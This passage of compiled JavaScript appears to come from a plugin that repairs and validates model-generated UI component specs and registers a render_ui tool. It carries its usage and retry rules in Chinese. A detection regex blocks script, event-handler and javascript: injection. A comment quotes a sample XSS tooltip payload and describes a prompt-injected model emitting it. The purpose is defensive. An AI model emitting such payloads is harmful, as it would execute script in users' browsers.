		"paper",
		"paper-2",
		"ink",
		"muted",
		"soft",
		"rule",
		"accent",
		"accent-tint",
		"link"
	]) {
		const c = color(o[key]);
		if (c !== void 0) out[key] = c;
	}
	return Object.keys(out).length === 0 ? void 0 : out;
}
function repairDiagramZones(v) {
	if (v === void 0) return [];
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const raw of v) {
		if (out.length >= GENUI_LIMITS.maxDiagramZones) break;
		const o = obj(raw);
		if (o === void 0) continue;
		const label = str(o.label, 64);
		if (label === void 0) continue;
		out.push({
			label,
			...opt("x", o.x === void 0 ? void 0 : grid4(num(o.x, -1e6, 1e6) ?? 0, 0, 1e6)),
			...opt("y", o.y === void 0 ? void 0 : grid4(num(o.y, -1e6, 1e6) ?? 0, 0, 1e6)),
			...opt("w", o.w === void 0 ? void 0 : grid4(num(o.w, -1e6, 1e6) ?? 100, 40, 2e3)),
			...opt("h", o.h === void 0 ? void 0 : grid4(num(o.h, -1e6, 1e6) ?? 100, 40, 1200))
		});
	}
	return out;
}
function repairDiagram(v) {
	const o = obj(v);
	if (o === void 0) return null;
	const kind = enu(o.kind, DIAGRAM_KINDS);
	if (kind === void 0) return null;
	const nodes = repairDiagramNodes(o.nodes);
	if (nodes === void 0) return null;
	const edges = repairDiagramEdges(o.edges);
	if (edges === void 0) return null;
	const zones = repairDiagramZones(o.zones);
	if (zones === void 0) return null;
	return {
		type: "diagram",
		kind,
		nodes,
		edges,
		zones,
		...opt("variant", enu(o.variant, DIAGRAM_VARIANTS)),
		...opt("title", str(o.title, 256)),
		...opt("theme", repairDiagramTheme(o.theme))
	};
}
function repairTimeline(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		const o = obj(item);
		const title = o === void 0 ? void 0 : str(o.title, 256);
		if (title === void 0) continue;
		out.push({
			title,
			...opt("desc", o === void 0 ? void 0 : str(o.desc, GENUI_LIMITS.maxString)),
			...opt("time", o === void 0 ? void 0 : str(o.time, 128))
		});
	}
	return out;
}
function repairTree(v, cap) {
	return walkTree(v, cap, GENUI_LIMITS.maxTreeDepth);
}
function walkTree(v, cap, depthLeft) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		const o = obj(item);
		const name = o === void 0 ? void 0 : str(o.name, 256);
		if (name === void 0) continue;
		const children = o !== void 0 && depthLeft > 0 && Array.isArray(o.children) ? walkTree(o.children, cap, depthLeft - 1) : void 0;
		out.push({
			name,
			...opt("type", o === void 0 ? void 0 : enu(o.type, FILE_TYPES)),
			...opt("children", children)
		});
	}
	return out;
}
function repairQuizOptions(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const optItem of v) {
		if (out.length >= GENUI_LIMITS.maxQuizOptions) break;
		const o = obj(optItem);
		const label = o === void 0 ? void 0 : str(o.label, 512);
		if (label === void 0) continue;
		out.push({
			label,
			...opt("correct", o === void 0 ? void 0 : o.correct === true ? true : void 0),
			...opt("feedback", o === void 0 ? void 0 : str(o.feedback, GENUI_LIMITS.maxString))
		});
	}
	return out;
}
/**
* Patterns that indicate HTML/script injection in a string field. ECharts
* default `tooltip.renderMode: 'html'` writes tooltip content via
* `innerHTML`; even with renderMode forced to 'richText' (see below),
* filtering these patterns is defense-in-depth — a model (or a
* prompt-injected model) should never emit `<script>`, `onerror=`, or
* `javascript:` inside a chart option string.
*/
const ECHART_HTML_DANGER_RE = /<(?:script|img|svg|iframe|video|audio|object|embed|source)\b|on[a-z]+\s*=|javascript:/i;
/**
* Sanitize an ECharts option object: depth-bounded, budget-bounded
* pass-through that strips dangerous values (functions, `url()` in styles,
* HTML/script injection patterns in strings) but preserves the object shape
* ECharts needs. Scalars are KEPT: ECharts options are full of them,
* including inside `data` arrays (`data: [120, 150, 180]`,
* `xAxis.data: ['1月', '2月']`). Previously a scalar hit the plain-object
* gate below and returned undefined, so every primitive-valued array was
* filtered to empty and dropped — a chart with a full `option` rendered
* with empty series (blank canvas). This is a safety walk, not an ECharts
* semantic validator.
*
* Security: `tooltip.renderMode` is forced to `'richText'` on every tooltip
* object. ECharts' default `'html'` mode writes tooltip content via
* `innerHTML`, which is an XSS vector when the option originates from model
* output — a prompt-injected model could emit
* `{"tooltip":{"formatter":"<img src=x onerror=...>"}}` and execute
* arbitrary script. `richText` renders as text, never touching innerHTML.
*/
function sanitizeEChartOption(v, depth, budget) {
	if (budget.count <= 0) return void 0;
	budget.count -= 1;
	if (depth > GENUI_LIMITS.maxEChartOptionDepth) return void 0;
	if (typeof v === "string") {
		const s = v.slice(0, GENUI_LIMITS.maxString);
		if (s.toLowerCase().includes("url(") || ECHART_HTML_DANGER_RE.test(s)) return void 0;
		return s;
	}
	if (typeof v === "number" && Number.isFinite(v)) return v;
	if (typeof v === "boolean") return v;
	if (v === null) return null;
	if (Array.isArray(v)) {
		const cap = Math.min(v.length, GENUI_LIMITS.maxEChartArrayLen);
		const arr = [];
		for (let i = 0; i < cap; i++) {
			const s = sanitizeEChartOption(v[i], depth + 1, budget);
			if (s !== void 0) arr.push(s);
		}
		return arr.length > 0 ? arr : void 0;
	}
	const o = obj(v);
	if (o === void 0) return void 0;
	const out = {};
	for (const [key, val] of Object.entries(o)) {
		const s = sanitizeEChartOption(val, depth + 1, budget);
		if (s === void 0) continue;
		if (key === "tooltip" && typeof s === "object" && s !== null && !Array.isArray(s)) s.renderMode = "richText";
		out[key] = s;
	}
	return Object.keys(out).length > 0 ? out : void 0;
}
/**
* Deterministically repair a raw spec value into a renderable GenuiSpec.
* Returns null only when the root is not an object with an `items` array
* (a bare component root is wrapped into a col first — the documented fence
* vocabulary allows single-component bodies); every other defect is healed by
* dropping/clamping/truncating. Idempotent: repairing a repaired spec is a
* no-op.
*/
function repairGenuiSpec(value) {
	const v = obj(value);
	if (v === void 0) return null;
	if (!Array.isArray(v.items)) {
		const wrapped = wrapSingleComponentRoot(value);
		if (wrapped === null) return null;
		return repairGenuiSpec(wrapped);
	}
	const ctx = { remaining: GENUI_LIMITS.maxNodes };
	return {
		...opt("title", str(v.title, GENUI_LIMITS.maxString)),
		...opt("gap", num(v.gap, 0, 96)),
		...opt("panel", v.panel === true ? true : void 0),
		...opt("append", v.append === true ? true : void 0),
		items: repairItems(v.items, ctx, 0)
	};
}
/** Static examples never echo user data (which can contain secrets). */
const DIAGNOSTIC_EXAMPLES = {
	spec: { items: [{
		type: "text",
		content: "内容"
	}] },
	node: {
		type: "text",
		content: "内容"
	},
	callout: {
		type: "callout",
		content: "说明"
	},
	keyvalue: {
		type: "keyvalue",
		pairs: [{
			key: "名称",
			value: "内容"
		}]
	},
	table: {
		type: "table",
		columns: ["名称"],
		rows: [["内容"]]
	},
	tabs: {
		type: "tabs",
		tabs: [{
			label: "标题",
			items: [{
				type: "text",
				content: "内容"
			}]
		}]
	},
	accordion: {
		type: "accordion",
		items: [{
			title: "标题",
			items: []
		}]
	},
	text: {
		type: "text",
		content: "内容"
	},
	stat: {
		type: "stat",
		label: "数量",
		value: "1"
	},
	steps: {
		type: "steps",
		steps: [{ title: "开始" }]
	},
	button: {
		type: "button",
		label: "继续",
		action: "continue"
	},
	checkbox: {
		type: "checkbox",
		label: "选项"
	},
	switch: {
		type: "switch",
		label: "开关"
	},
	link: {
		type: "link",
		label: "链接",
		href: "https://example.com"
	},
	audio: {
		type: "audio",
		src: "/example.mp3"
	},
	video: {
		type: "video",
		src: "/example.mp4"
	},
	select: {
		type: "select",
		options: ["选项"]
	},
	radio: {
		type: "radio",
		options: ["选项"]
	},
	submit: {
		type: "submit",
		label: "提交",
		action: "submit"
	},
	badge: {
		type: "badge",
		label: "状态"
	},
	progress: {
		type: "progress",
		value: 50
	},
	avatar: {
		type: "avatar",
		name: "姓名"
	},
	list: {
		type: "list",
		items: ["内容"]
	},
	chart: {
		type: "chart",
		data: [{
			label: "数量",
			value: 1
		}]
	},
	plot: {
		type: "plot",
		series: [{ expr: "x" }]
	},
	diff: {
		type: "diff",
		diffs: [{
			path: "example.txt",
			oldText: null,
			newText: "内容"
		}]
	},
	json: {
		type: "json",
		value: {}
	},
	code: {
		type: "code",
		code: "example"
	},
	copy: {
		type: "copy",
		text: "内容"
	},
	mermaid: {
		type: "mermaid",
		code: "graph TD\nA-->B"
	},
	scene3d: {
		type: "scene3d",
		meshes: [{ shape: "box" }]
	},
	timeline: {
		type: "timeline",
		items: [{ title: "开始" }]
	},
	"file-tree": {
		type: "file-tree",
		items: [{
			name: "example.txt",
			type: "file"
		}]
	},
	breadcrumb: {
		type: "breadcrumb",
		items: ["首页"]
	},
	quiz: {
		type: "quiz",
		question: "选择",
		options: [{
			label: "A",
			correct: true
		}]
	},
	diagram: {
		type: "diagram",
		kind: "architecture",
		nodes: [],
		edges: []
	},
	echart: {
		type: "echart",
		preset: "bar",
		data: [{
			label: "数量",
			value: 1
		}]
	}
};
function diagnosticType(value) {
	return value === void 0 ? "missing" : value === null ? "null" : Array.isArray(value) ? "array" : typeof value;
}
/**
* Diagnose actual content loss using the SAME repair functions as rendering.
* The existing validator describes failed nodes only; repaired aliases and
* defaulted optional fields never become false failures. Paths address raw
* input, including tabs.content's singleton and array forms.
*/
function diagnoseGenuiSpec(value) {
	const errors = [];
	const root = obj(value);
	if (root === void 0) return {
		ok: false,
		errors: ["$: expected object; got " + diagnosticType(value)]
	};
	const add = (path, type, expected, actual) => {
		if (errors.length >= 12) return;
		const example = DIAGNOSTIC_EXAMPLES[type];
		errors.push(`${path} (${type}): ${actual === void 0 ? "missing field" : "type/format error"}; expected ${expected}; got ${diagnosticType(actual)}` + (example === void 0 ? "" : `; example: ${JSON.stringify(example)}`));
	};
	let visited = 0;
	const walk = (node, at, depth) => {
		if (visited++ >= GENUI_LIMITS.maxNodes || depth > GENUI_LIMITS.maxDepth) {
			add(at, "spec", `at most ${GENUI_LIMITS.maxNodes} nodes / depth ${GENUI_LIMITS.maxDepth}`, node);
			return;
		}
		const v = obj(node);
		if (v === void 0) {
			add(at, "node", "object", node);
			return;
		}
		if (typeof v.type !== "string") {
			add(`${at}.type`, "node", "string", v.type);
			return;
		}
		const type = GENUI_NODE_TYPES.has(v.type) ? v.type : "custom";
		if (type === "table") normalizeTableFields(v, (field, expected, actual) => add(`${at}.${field}`, type, expected, actual));
		if (repairNode(v, { remaining: GENUI_LIMITS.maxNodes }, depth) === null) {
			const reasons = [];
			validateNode(v, depth, at, reasons, () => {});
			for (const reason of reasons.slice(0, 4)) {
				const field = /requires ([\w]+)|'([\w]+)' must/.exec(reason);
				const key = field?.[1] ?? field?.[2];
				if (key !== void 0) {
					const expected = /\(([^)]+)\)/.exec(reason)?.[1] ?? "valid field value";
					add(`${at}.${key}`, type, expected, v[key]);
				}
			}
			if (reasons.length === 0 || !reasons.some((r) => /requires |'\w+' must/.test(r))) add(at, type, "renderable component fields (see genui skill)", node);
			return;
		}
		if (type === "keyvalue") repairPairs(v.pairs, GENUI_LIMITS.maxKeyValuePairs, (index, field, expected, actual) => {
			add(`${at}.pairs[${index}]${field}`, type, expected, actual);
		});
		if (type === "steps" && Array.isArray(v.steps)) for (let i = 0; i < Math.min(v.steps.length, GENUI_LIMITS.maxSteps); i++) {
			const step = obj(v.steps[i]);
			if (step === void 0) add(`${at}.steps[${i}]`, type, "object with title (string)", v.steps[i]);
			else if (typeof step.title !== "string") add(`${at}.steps[${i}].title`, type, "string", step.title);
		}
		const children = (items, path) => {
			if (!Array.isArray(items)) {
				add(path, type, "array", items);
				return;
			}
			for (let i = 0; i < items.length && visited <= GENUI_LIMITS.maxNodes; i++) walk(items[i], `${path}[${i}]`, depth + 1);
		};
		if ([
			"row",
			"col",
			"grid",
			"card"
		].includes(type)) children(v.items, `${at}.items`);
		else if (type === "list" && Array.isArray(v.items)) for (let i = 0; i < v.items.length && visited <= GENUI_LIMITS.maxNodes; i++) {
			const item = obj(v.items[i]);
			if (item !== void 0 && typeof item.type === "string" && typeof item.title !== "string") walk(item, `${at}.items[${i}]`, depth + 1);
		}
		else if (type === "tabs" && Array.isArray(v.tabs) || type === "accordion" && Array.isArray(v.items)) {
			const field = type === "tabs" ? "tabs" : "items";
			const holders = v[field];
			const cap = type === "tabs" ? GENUI_LIMITS.maxTabs : GENUI_LIMITS.maxAccordionItems;
			for (let i = 0; i < Math.min(holders.length, cap); i++) {
				const holder = obj(holders[i]);
				const path = `${at}.${field}[${i}]`;
				if (holder === void 0) {
					add(path, type, "object", holders[i]);
					continue;
				}
				const label = type === "tabs" ? "label" : "title";
				if (typeof holder[label] !== "string") {
					add(`${path}.${label}`, type, "string", holder[label]);
					continue;
				}
				if (type === "tabs" && holder.items === void 0 && holder.content !== void 0) {
					if (Array.isArray(holder.content)) children(holder.content, `${path}.content`);
					else walk(holder.content, `${path}.content`, depth + 1);
				} else children(holder.items, `${path}.items`);
			}
		}
	};
	if (Array.isArray(root.items)) for (let i = 0; i < root.items.length && visited <= GENUI_LIMITS.maxNodes; i++) walk(root.items[i], `$.items[${i}]`, 0);
	else if (wrapSingleComponentRoot(value) !== null) walk(value, "$", 0);
	else add("$.items", "spec", "array", root.items);
	return {
		ok: errors.length === 0,
		errors
	};
}
/**
* Count the nodes of a spec tree (every item, descending into tabs /
* accordion / file-tree / list containers — the same descent
* `validateGenuiSpec` walks). Shared by the panel fold (node-budget gate)
* and validation, so the panel never runs a second, divergent traversal.
* `cap` bounds the walk for hostile inputs; the panel passes
* `PANEL_LIMITS.maxNodes + 1` to detect overflow without counting the whole
* tree.
*/
function countGenuiNodes(value, cap = Number.POSITIVE_INFINITY) {
	let count = 0;
	const walk = (list) => {
		if (!Array.isArray(list)) return;
		for (const item of list) {
			if (count >= cap) return;
			count += 1;
			const v = obj(item);
			if (v === void 0) continue;
			if (v.type === "tabs" && Array.isArray(v.tabs)) for (const t of v.tabs) {
				if (count >= cap) return;
				const to = obj(t);
				if (to !== void 0) walk(to.items);
			}
			else if (v.type === "accordion" && Array.isArray(v.items)) for (const it of v.items) {
				if (count >= cap) return;
				const io = obj(it);
				if (io !== void 0) walk(io.items);
			}
			else if ((v.type === "row" || v.type === "col" || v.type === "grid" || v.type === "card") && Array.isArray(v.items)) walk(v.items);
			else if (v.type === "file-tree" && Array.isArray(v.items)) walk(v.items);
			else if (v.type === "list" && Array.isArray(v.items)) for (const li of v.items) {
				if (count >= cap) return;
				const lo = obj(li);
				if (lo !== void 0 && typeof lo.type === "string") walk([lo]);
			}
		}
	};
	const root = obj(value);
	walk(root === void 0 ? [] : root.items);
	return count;
}
/** Every white-listed node `type`. Keep in sync with the repairNode switch —
* validate_dsh_ui uses it to tell declared GenUI nodes apart from unrelated
* `"type"` strings (e.g. file-tree's `{type:'file'}` children). */
const GENUI_NODE_TYPES = /* @__PURE__ */ new Set([
	"accordion",
	"audio",
	"avatar",
	"badge",
	"breadcrumb",
	"button",
	"callout",
	"card",
	"chart",
	"checkbox",
	"code",
	"col",
	"copy",
	"diff",
	"divider",
	"file-tree",
	"grid",
	"input",
	"json",
	"keyvalue",
	"link",
	"list",
	"mermaid",
	"plot",
	"progress",
	"quiz",
	"radio",
	"row",
	"scene3d",
	"select",
	"slider",
	"spacer",
	"stat",
	"steps",
	"submit",
	"switch",
	"table",
	"tabs",
	"text",
	"textarea",
	"timeline",
	"video",
	"echart",
	"diagram"
]);
function validateNode(value, depth, at, errors, walk) {
	if (depth > GENUI_LIMITS.maxDepth) {
		errors.push(`${at}: exceeds max depth ${GENUI_LIMITS.maxDepth}`);
		return;
	}
	const v = obj(value);
	if (v === void 0) {
		errors.push(`${at}: must be an object`);
		return;
	}
	const type = v.type;
	if (typeof type !== "string") {
		errors.push(`${at}: missing string 'type'`);
		return;
	}
	const isStr = (name) => {
		if (v[name] !== void 0 && typeof v[name] !== "string") errors.push(`${at}: '${name}' must be a string`);
	};
	const isNum = (name) => {
		if (v[name] !== void 0 && (typeof v[name] !== "number" || !Number.isFinite(v[name]))) errors.push(`${at}: '${name}' must be a finite number`);
	};
	switch (type) {
		case "text":
			if (typeof v.content !== "string" && typeof v.text !== "string") errors.push(`${at}: type 'text' requires content or text (string)`);
			isStr("content");
			isStr("text");
			break;
		case "row":
		case "col":
		case "card":
		case "grid":
			if (!Array.isArray(v.items)) errors.push(`${at}: type '${type}' requires items (array)`);
			walk(v.items, depth + 1, `${at}.items`);
			if (type === "grid") isNum("cols");
			break;
		case "button":
		case "checkbox":
		case "link":
		case "switch":
			if (typeof v.label !== "string") errors.push(`${at}: type '${type}' requires label (string)`);
			isStr("label");
			break;
		case "audio":
		case "video":
			if (typeof v.src !== "string") errors.push(`${at}: type '${type}' requires src (string)`);
			isStr("src");
			isStr("alt");
			if (type === "video") isStr("poster");
			break;
		case "slider":
			isStr("label");
			isNum("min");
			isNum("max");
			isNum("step");
			isNum("value");
			break;
		case "input":
		case "textarea":
			isStr("label");
			isStr("placeholder");
			isStr("value");
			break;
		case "select":
		case "radio":
			if (!Array.isArray(v.options)) errors.push(`${at}: type '${type}' requires options (array)`);
			break;
		case "submit":
			if (typeof v.label !== "string") errors.push(`${at}: type 'submit' requires label (string)`);
			break;
		case "badge":
			if (typeof v.label !== "string" && typeof v.text !== "string" && typeof v.value !== "string") errors.push(`${at}: type 'badge' requires label, text, or value (string)`);
			isStr("label");
			isStr("text");
			isStr("value");
			break;
		case "stat":
			if (typeof v.label !== "string") errors.push(`${at}: type 'stat' requires label (string)`);
			if (typeof v.value !== "string") errors.push(`${at}: type 'stat' requires value (string)`);
			isStr("delta");
			break;
		case "progress":
			if (typeof v.value !== "number" || !Number.isFinite(v.value) || v.value < 0 || v.value > 100) errors.push(`${at}: type 'progress' requires value (number 0..100)`);
			isNum("value");
			break;
		case "avatar":
			if (typeof v.name !== "string") errors.push(`${at}: type 'avatar' requires name (string)`);
			break;
		case "list":
			if (!Array.isArray(v.items)) errors.push(`${at}: type 'list' requires items (array)`);
			if (Array.isArray(v.items)) for (let i = 0; i < v.items.length; i++) {
				const item = obj(v.items[i]);
				if (item !== void 0 && typeof item.type === "string") validateNode(item, depth + 1, `${at}.items[${i}]`, errors, walk);
			}
			break;
		case "table":
			if (!Array.isArray(v.columns)) errors.push(`${at}: type 'table' requires columns (array)`);
			if (!Array.isArray(v.rows)) errors.push(`${at}: type 'table' requires rows (array)`);
			break;
		case "chart":
			if (!Array.isArray(v.data) && !Array.isArray(v.series)) errors.push(`${at}: type 'chart' requires data or series (array)`);
			break;
		case "tabs":
			if (!Array.isArray(v.tabs)) errors.push(`${at}: type 'tabs' requires tabs (array)`);
			if (Array.isArray(v.tabs)) for (let i = 0; i < v.tabs.length; i++) {
				const t = obj(v.tabs[i]);
				if (t === void 0) {
					errors.push(`${at}.tabs[${i}] must be an object`);
					continue;
				}
				if (typeof t.label !== "string") errors.push(`${at}.tabs[${i}].label must be a string`);
				walk(t.items, depth + 1, `${at}.tabs[${i}].items`);
			}
			break;
		case "plot":
			if (!Array.isArray(v.series)) errors.push(`${at}: type 'plot' requires series (array)`);
			break;
		case "callout":
			if (typeof v.content !== "string" && typeof v.text !== "string") errors.push(`${at}: type 'callout' requires content (string)`);
			break;
		case "steps":
			if (!Array.isArray(v.steps)) errors.push(`${at}: type 'steps' requires steps (array)`);
			break;
		case "keyvalue":
			if (!Array.isArray(v.pairs)) errors.push(`${at}: type 'keyvalue' requires pairs (array)`);
			break;
		case "diff":
			if (!Array.isArray(v.diffs)) errors.push(`${at}: type 'diff' requires diffs (array)`);
			break;
		case "json":
			if (!("value" in v)) errors.push(`${at}: type 'json' requires value`);
			break;
		case "code":
			if (typeof v.code !== "string") errors.push(`${at}: type 'code' requires code (string)`);
			break;
		case "accordion":
			if (!Array.isArray(v.items)) errors.push(`${at}: type 'accordion' requires items (array)`);
			if (Array.isArray(v.items)) for (let i = 0; i < v.items.length; i++) {
				const item = obj(v.items[i]);
				if (item === void 0) {
					errors.push(`${at}.items[${i}] must be an object`);
					continue;
				}
				if (typeof item.title !== "string") errors.push(`${at}.items[${i}].title must be a string`);
				walk(item.items, depth + 1, `${at}.items[${i}].items`);
			}
			break;
		case "copy":
			if (typeof v.text !== "string") errors.push(`${at}: type 'copy' requires text (string)`);
			break;
		case "mermaid":
			if (typeof v.code !== "string") errors.push(`${at}: type 'mermaid' requires code (string)`);
			break;
		case "scene3d":
			if (!Array.isArray(v.meshes)) errors.push(`${at}: type 'scene3d' requires meshes (array)`);
			break;
		case "timeline":
			if (!Array.isArray(v.items)) errors.push(`${at}: type 'timeline' requires items (array)`);
			break;
		case "file-tree":
			if (!Array.isArray(v.items)) errors.push(`${at}: type 'file-tree' requires items (array)`);
			break;
		case "breadcrumb":
			if (!Array.isArray(v.items)) errors.push(`${at}: type 'breadcrumb' requires items (array)`);
			break;
		case "quiz":
			if (typeof v.question !== "string") errors.push(`${at}: type 'quiz' requires question (string)`);
			if (!Array.isArray(v.options)) errors.push(`${at}: type 'quiz' requires options (array)`);
			break;
		case "diagram":
			if (typeof v.kind !== "string") errors.push(`${at}: type 'diagram' requires kind (string)`);
			if (!Array.isArray(v.nodes)) errors.push(`${at}: type 'diagram' requires nodes (array)`);
			if (v.edges !== void 0 && !Array.isArray(v.edges)) errors.push(`${at}: type 'diagram' requires edges (array) when present`);
			break;
		case "echart":
			if (v.option === void 0 && v.data === void 0 && v.series === void 0) errors.push(`${at}: type 'echart' requires option, data, or series`);
			isNum("height");
			break;
		default: errors.push(`${at}: unknown type '${type}' (custom renderer?)`);
	}
}
//#endregion
//#region src/shared/fence-repair.ts
/**
* Tier-2 repair — SETTLED MESSAGES ONLY (never while streaming): heals
* structural incompleteness — missing closing quotes/brackets — by appending
* the missing terminators, and heals stray closers — a `]` mistyped as `}` or
* a duplicated terminator — by skipping closers that do not match the open
* stack (they cannot be legal JSON). Callers gate it on settled messages (the
* client uses the host-provided fence source; the validate tool is by
* definition pre-emission), so a streaming half can never flash premature UI.
*
* ONE unified scan: the tier-1 fixes (quote escaping + trailing-comma drops)
* are folded into the same pass, so bodies that combine BOTH defect classes
* (a trailing comma AND a missing closer) heal in one shot — the old
* two-phase chain lost tier-1's partial work when its whole-body parse
* failed, and re-scanning the raw text could not compose the repairs.
* Adopted only when the completed body parses as whole JSON.
*/
function completeFenceJson(raw) {
	try {
		JSON.parse(raw);
		return null;
	} catch {}
	let out = "";
	const stack = [];
	let inString = false;
	let escaped = false;
	let repairs = 0;
	for (let i = 0; i < raw.length; i++) {
		const ch = raw[i];
		if (escaped) {
			out += ch;
			escaped = false;
			continue;
		}
		if (inString) {
			if (ch === "\\") {
				out += ch;
				escaped = true;
				continue;
			}
			if (ch !== "\"") {
				out += ch;
				continue;
			}
			let j = i + 1;
			while (j < raw.length && (raw[j] === " " || raw[j] === "	" || raw[j] === "\n" || raw[j] === "\r")) j++;
			const next = j < raw.length ? raw[j] : "";
			if (next === "," || next === "]" || next === "}" || next === ":" || next === "") {
				inString = false;
				out += ch;
			} else {
				out += "\\\"";
				repairs++;
			}
			continue;
		}
		if (ch === "\"") {
			inString = true;
			out += ch;
			continue;
		}
		if (ch === "{") {
			stack.push("}");
			out += ch;
			continue;
		}
		if (ch === "[") {
			stack.push("]");
			out += ch;
			continue;
		}
		if (ch === "}" || ch === "]") {
			if (stack[stack.length - 1] === ch) {
				stack.pop();
				out += ch;
			} else repairs++;
			continue;
		}
		if (ch === ",") {
			let j = i + 1;
			while (j < raw.length && (raw[j] === " " || raw[j] === "	" || raw[j] === "\n" || raw[j] === "\r")) j++;
			const next = j < raw.length ? raw[j] : "";
			if (next === "}" || next === "]" || next === "") {
				repairs++;
				continue;
			}
		}
		out += ch;
	}
	if (inString) {
		out += "\"";
		repairs++;
	}
	while (stack.length > 0) {
		out += stack.pop();
		repairs++;
	}
	if (repairs === 0) return null;
	try {
		JSON.parse(out);
		return {
			text: out,
			repairs
		};
	} catch {
		return null;
	}
}
//#endregion
//#region src/plugin/contract.ts
/** Shared model instructions: the budget belongs to one display, never a session. */
const GENUI_AUTHORING_RULE = "先获取字段说明：加载 genui 技能正文后再编写 spec；技能不可用时直接用普通 Markdown 交付内容。常用字段：callout.content 为字符串（兼容 text 别名）；keyvalue.pairs 为 [{\"key\":\"名称\",\"value\":\"内容\"}]；table.columns 为字符串数组、rows 为二维数组；tabs.tabs 为 [{\"label\":\"名称\",\"items\":[]}]。";
const GENUI_RETRY_RULE = "同一展示总共最多 2 次 validate_dsh_ui（初次 + 1 次修复验证；包括同一个 run_code 中的批量调用）。初次失败只按诊断修正一次；修复后仍失败，立即用普通 Markdown 交付原本内容，停止 UI 尝试。不得枚举组件变体探测、换组件继续凑次数或无限重试。";
//#endregion
//#region src/plugin/tool.ts
/**
* Arguments schema: an open `spec` slot. The schema must NOT reject anything
* the guard could repair — the model's component trees are imperfect by
* nature, and the guard heals them; argument validation would only strand
* them. `additionalProperties: false` keeps the call shape honest.
*
* `spec` IS typed `object` on purpose: the guard can only repair plain
* records (a serialized JSON string, array, or scalar root is unusable), so
* argument validation rejecting non-objects loses nothing repairable — and
* it stops the model from double-encoding the tree as a string (observed
* twice in the wild), failing fast with a clear schema error instead.
*/
const RENDER_UI_PARAMETERS = {
	type: "object",
	properties: { spec: {
		type: "object",
		description: "GenUI component tree (white-listed vocabulary, see the dsh-ui fence section in the system prompt). Deep-validated and repaired by the renderer. Pass the spec as a JSON OBJECT — never as a serialized JSON string (a string fails argument validation).",
		properties: {
			title: {
				type: "string",
				description: "Short title shown as the card banner."
			},
			gap: {
				type: "number",
				description: "Vertical gap between root items in px."
			},
			panel: {
				type: "boolean",
				description: "Panel-only: renders into the session panel dock instead of the message flow."
			},
			items: {
				type: "array",
				description: "Root component list (white-listed vocabulary).",
				items: { type: "object" }
			}
		}
	} },
	required: ["spec"],
	additionalProperties: false
};
/** The tool's canonical value is a short model-facing summary string. */
const RENDER_UI_OUTPUT_SCHEMA = {
	type: "string",
	description: "One-line human-readable render summary for the model."
};
/**
* Read the `spec` argument defensively (presenters run on replayed args).
*
* The harness tool-call bridge has been observed to deliver arguments in
* shapes other than the authored `{ spec: <object> }`:
* - `{ spec: "<JSON string>" }` — spec serialized to text;
* - `{ arguments: "<JSON string>" }` / `{ arguments: <object> }` — a
*   double-encoded wrapper from the SDK tool-call bridge (seen live in the
*   web GUI: small specs arrived wrapped this way, large specs arrived with
*   their JSON corrupted mid-stream);
* - a bare JSON string (double-encoded root).
* Each shape is unwrapped here so the guard can repair the actual tree.
* Corrupted JSON cannot be recovered (bytes were lost in transit): it yields
* `undefined` plus a diagnostic log line for the transport-layer bug.
*/
function specOf(args) {
	if (typeof args === "string") return parseSpecJson(args, "bare-string");
	if (typeof args !== "object" || args === null) return void 0;
	const record = args;
	if ("spec" in record) {
		const s = record.spec;
		if (typeof s === "string") return parseSpecJson(s, "spec-string");
		return unwrapSpec(s, "spec");
	}
	if ("arguments" in record) {
		const a = record.arguments;
		if (typeof a === "string") return parseSpecJson(a, "arguments-string");
		if (typeof a === "object" && a !== null) return unwrapSpec(a, "arguments");
	}
}
/**
* Peel nested `{ spec: ... }` wrapper layers. Observed bridge shapes nest the
* authored `spec` object one or more levels deep (e.g. the serialized text
* inside `{ arguments: "..." }` is itself `{ spec: { title, gap, items } }`),
* so unwrapping stops only at a value that carries no `spec` key.
*/
function unwrapSpec(value, shape) {
	if (typeof value === "object" && value !== null) {
		const record = value;
		if ("spec" in record) {
			const s = record.spec;
			if (typeof s === "string") return parseSpecJson(s, `${shape}/spec-string`);
			return unwrapSpec(s, `${shape}/spec`);
		}
	}
	return value;
}
/** Try to decode a serialized spec; log a diagnostic when it is broken. */
function parseSpecJson(raw, shape) {
	try {
		return unwrapSpec(JSON.parse(raw), shape);
	} catch (error) {
		const detail = error instanceof Error ? error.message : String(error);
		const pos = /position (\d+)/.exec(detail)?.[1] ?? "?";
		console.error(`[genui-tool] spec wrapped as ${shape} but its JSON is broken (${raw.length} bytes, error at ${pos}); cannot recover — bytes lost in transit`);
		return;
	}
}
/** Total node count of a repaired spec — the shared guard traversal
* (`countGenuiNodes`) so the tool reports the SAME number the panel fold and
* validation use. A local walker used to under-count specs whose content
* lives inside tabs/accordion/file-tree (their children are not `.items`). */
function countNodes(spec) {
	return countGenuiNodes(spec, GENUI_LIMITS.maxNodes);
}
/** Tool-call title shared by the pending and completed presentations. */
function cardTitle(args) {
	const spec = repairGenuiSpec(specOf(args));
	return spec === null ? void 0 : `渲染 UI：${spec.title ?? "未命名"}`;
}
/**
* Build the render_ui tool definition. Registered by the plugin node half;
* `ctx.tools.register` consumes it exactly like a `defineTool` result.
*/
function createRenderUiTool() {
	return {
		name: "render_ui",
		description: "Render an interactive UI card in the conversation tool row by passing a GenUI spec (a white-listed component tree; the same vocabulary as the ```dsh-ui fence, see the system prompt). " + GENUI_AUTHORING_RULE + GENUI_RETRY_RULE + "Use it when the user asks for a structured panel, dashboard, or form that belongs in the tool row rather than inline in the reply. The card is interactive client-side (tabs, buttons, inputs, switches); components carrying an \"action\" field send [genui-action] back to you when the user interacts, and you should re-render the updated UI.",
		parameters: RENDER_UI_PARAMETERS,
		output: {
			schema: RENDER_UI_OUTPUT_SCHEMA,
			render(_args, value) {
				return [{
					type: "text",
					text: String(value)
				}];
			},
			presentationMeta(args) {
				return repairGenuiSpec(specOf(args));
			}
		},
		async execute(args) {
			const spec = repairGenuiSpec(specOf(args));
			if (spec === null) return "render_ui：spec 无效 —— 根对象需要 \"items\" 数组。" + GENUI_RETRY_RULE;
			return `已渲染 UI「${spec.title ?? "未命名"}」（${countNodes(spec)} 个组件）。用户现在可以看到这张卡片；组件带 action 时，用户交互会以 [genui-action] 消息发回给你，届时请重新渲染更新后的界面。`;
		},
		presentCall(args) {
			const title = cardTitle(args);
